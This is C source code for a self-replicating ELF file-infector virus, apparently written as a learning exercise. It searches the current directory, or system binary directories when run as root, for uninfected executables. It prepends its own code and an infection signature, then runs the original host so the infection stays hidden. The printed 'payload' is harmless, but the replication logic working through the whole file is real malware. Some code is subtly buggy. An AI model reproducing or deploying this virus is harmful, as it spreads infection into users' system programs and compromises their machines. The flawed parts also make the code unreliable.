#include <stdio.h>      	
#include <dirent.h>       	
#include <stdbool.h>      	
#include <sys/stat.h>     	 
#include <sys/sendfile.h> 	
#include <sys/wait.h>	  	
#include <fcntl.h>        	 
#include <unistd.h>		
#include <stdlib.h>
#include <time.h>
#include <string.h>

#define SIGNATURE 4033
#define SIZE 18152
#define PAYLOAD_MESSAGE "Virus has entered your system [^-^]\n"
#define TEMP_FILENAME ".tempFile"

void executeSomethingBad();
char* getCleanHostFile(char *self_name);
bool isOriginalVirus(int vfd);
bool isELF(char* fileName);
bool isClean(char* fileName);
void infectHostFile(char* hostFileName, int vfd);
void appendSignature(int vfd, char* fileName, mode_t mode, int size);
void executeHostPart(int vfd, mode_t mode, int totalSize, char *argv[]);

static inline int get_random_number(int max_num){
	return rand()%4;
}
static inline char * randomly_select_dir(char **dirs) 
{	
	return (char *)dirs[get_random_number(4)];
}
void main(int argc, char *argv[]) {
	srand(time(0));
	int virus_fd = open(argv[0], O_RDONLY);

	// getting file statistics
	struct stat st;
	fstat(virus_fd, &st);

	executeSomethingBad();
	
	char* cleanHostName = getCleanHostFile((char*)argv[0] + 2);
	if(cleanHostName != NULL) 
		infectHostFile(cleanHostName, virus_fd);
		 

	if(isOriginalVirus(virus_fd))
		appendSignature(virus_fd, argv[0], st.st_mode, st.st_size);
	else
		executeHostPart(virus_fd, st.st_mode, st.st_size, argv);

	close(virus_fd);
}

/**
 * Returns true if this file has only the virus code
 */
bool isOriginalVirus(int vfd) {
	return SIZE == lseek(vfd, 0, SEEK_END);
}

/*Gets an ELF file's name that is not yet infected. If no such files are found, NULL is returned*/
char* getCleanHostFile(char *self_name) {
	struct stat st;
	
	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" }; //Addresses of the directories to attack if the user of root
	char cwd[2] = {'.', '\0'}; 
	char *selected_dir = getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
	DIR *dir = opendir(selected_dir);
	
	struct dirent *dp;
	
	while((dp = readdir(dir)) != NULL){
		stat(dp->d_name, &st);
			printf("%ld %ld\n",strlen(dp->d_name),strlen(self_name));
		if(dp->d_name == self_name) {
			continue;
		}	// Don't infect self
		if(isELF(dp->d_name) && isClean(dp->d_name)){
			closedir(dir);
			return dp->d_name;
		}
	}

	closedir(dir);
	return NULL;
}

/**
 * Returns true if the file's format is ELF
 * (Executeable and Linkable Format)
 * ELF files have the first four bytes as 
 * {0x7f, 'E', 'L', 'F'}.
 */
bool isELF(char* fileName) {
	if(fileName[0] == '.') return false;

	int hfd = open(fileName, O_RDONLY);
	char header[4];
	read(hfd, header, 4);
	close(hfd);

	return header[0] == 0x7f
		&& header[1] == 'E'
		&& header[2] == 'L'
		&& header[3] == 'F';
}

/**
 * Returns true if the file has not been infected yet
 * by checking the last few bytes of the file 
 */
bool isClean(char* fileName) {
	int signature;
	int fd = open(fileName, O_RDONLY);
	lseek(fd, -1 * sizeof(signature), SEEK_END);
	read(fd, &signature, sizeof(signature));
	close(fd);
	return signature != SIGNATURE;
}

/**
 * Infect host file by creating a temporary file; 
 * appending the virus/infected file, clean ELF host, and signature;
 * and replacing the host file with the temporary file.
 */
void infectHostFile(char* hostFileName, int vfd) {
	int hfd = open(hostFileName, O_RDONLY);	
	struct stat st;
	fstat(hfd, &st);
	int hostSize = st.st_size;

	int signature = SIGNATURE;
	
	int tfd = creat(TEMP_FILENAME, st.st_mode);	
	// Virus->Host->Signature
	sendfile(tfd, vfd, NULL, SIZE);
	sendfile(tfd, hfd, NULL, hostSize);
	write(tfd, &signature, sizeof(signature));

	rename(TEMP_FILENAME, hostFileName);

	close(tfd);
	close(hfd);
}

/**
 * Append signature to the virus 
 */
void appendSignature(int vfd, char* fileName, mode_t mode, int size) {
	int tfd = creat(TEMP_FILENAME, mode);
	int signature = SIGNATURE;
	lseek(vfd, 0, SEEK_SET);
	sendfile(tfd, vfd, NULL, size);
	write(tfd, &signature, sizeof(signature));
	close(tfd);
	rename(TEMP_FILENAME, fileName);
}

/**
 * Execute the original host program inside this object file
 */
void executeHostPart(int vfd, mode_t mode, int totalSize, char *argv[]) {
	int tfd = creat(TEMP_FILENAME, mode);

	lseek(vfd, SIZE, SEEK_SET);
	int signatureSize = sizeof(SIGNATURE);
	int hostSize = totalSize - SIZE - signatureSize;
	sendfile(tfd, vfd, NULL, hostSize);
	close(tfd);

	pid_t pid = fork();			
	if(pid == 0) { 			
		execv(TEMP_FILENAME, argv);
	}
	else{					
		waitpid(pid, NULL, 0);		
		unlink(TEMP_FILENAME);
	}
}

// Malicious behaviour
void executeSomethingBad() {
	puts(PAYLOAD_MESSAGE);
}
